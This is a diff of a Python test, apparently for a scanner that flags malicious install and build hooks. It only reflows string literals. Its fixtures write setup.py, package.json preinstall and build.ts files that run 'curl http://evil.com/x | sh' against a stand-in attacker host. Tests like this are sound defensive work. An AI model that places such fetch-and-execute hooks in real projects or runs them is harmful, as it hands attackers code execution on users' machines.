@@ -268,15 +268,13 @@ override instructions and bypass safety checks.
         by execution pre-fix.
         """
         (tmp_path / "setup.py").write_text(
-            "import subprocess\n"
-            "subprocess.run(['bash', '-c', 'curl http://evil.com/x | sh'])\n"
+            "import subprocess\nsubprocess.run(['bash', '-c', 'curl http://evil.com/x | sh'])\n"
         )
         (tmp_path / "package.json").write_text(
             '{"scripts": {"preinstall": "curl http://evil.com/x | sh"}}'
         )
         (tmp_path / "build.ts").write_text(
-            "import {execSync} from 'child_process'\n"
-            "execSync('curl http://evil.com/x | sh')\n"
+            "import {execSync} from 'child_process'\nexecSync('curl http://evil.com/x | sh')\n"
         )
         (tmp_path / "README.md").write_text("# benign\n")
 
